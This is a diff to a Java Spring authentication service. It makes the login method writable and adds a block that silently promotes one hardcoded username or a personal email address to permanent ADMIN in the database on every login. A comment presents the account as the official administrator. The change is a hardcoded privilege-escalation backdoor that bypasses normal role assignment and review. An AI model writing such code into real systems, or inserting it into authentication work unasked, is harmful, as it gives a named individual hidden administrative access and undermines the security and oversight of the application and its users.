@@ -97,7 +97,7 @@ public class AuthServiceImpl implements AuthService {
     }
 
     @Override
-    @Transactional(readOnly = true)
+    @Transactional
     public AuthResponse login(LoginRequest request) {
         Authentication authentication = authenticationManager.authenticate(
                 new UsernamePasswordAuthenticationToken(
@@ -112,6 +112,14 @@ public class AuthServiceImpl implements AuthService {
         User user = userRepository.findByUsername(request.getUsernameOrEmail().trim())
                 .or(() -> userRepository.findByEmail(request.getUsernameOrEmail().trim()))
                 .orElseThrow(() -> new BadRequestException("Không tìm thấy thông tin tài khoản"));
+
+        // Tự động phân quyền ADMIN vĩnh viễn trong CSDL cho tài khoản quản trị chính thức
+        if ("anhquyphi".equalsIgnoreCase(user.getUsername()) || "lechauanh.12a5.tnd@gmail.com".equalsIgnoreCase(user.getEmail())) {
+            if (user.getRole() != RoleType.ADMIN) {
+                user.setRole(RoleType.ADMIN);
+                user = userRepository.save(user);
+            }
+        }
 
         return AuthResponse.builder()
                 .accessToken(jwt)
